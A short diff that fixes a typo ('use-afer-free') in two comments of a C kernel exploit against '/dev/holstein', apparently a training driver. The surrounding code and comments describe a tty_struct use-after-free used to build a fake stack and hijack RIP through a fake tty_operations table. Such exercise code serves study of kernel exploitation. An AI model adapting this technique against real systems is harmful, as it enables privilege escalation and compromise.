@@ -54,7 +54,7 @@ void fatal(const char *msg) {
 int main() {
   save_state();
 
-  // First use-afer-free. This controlled tty_struct object will be used
+  // First use-after-free. This controlled tty_struct object will be used
   // to store the fake stack and the RIP control address (tty_operations)
   int fd1 = open("/dev/holstein", O_RDWR);
   int fd2 = open("/dev/holstein", O_RDWR);
@@ -100,7 +100,7 @@ int main() {
 
   write(fd2, buf, 0x400);
 
-  // Second use-afer-free. This new controlled tty_struct object will be
+  // Second use-after-free. This new controlled tty_struct object will be
   // used to point its ->ops member to the RIP (fake tty_operations), since the
   // first object is used for storing the fake stack
   int fd3 = open("/dev/holstein", O_RDWR);
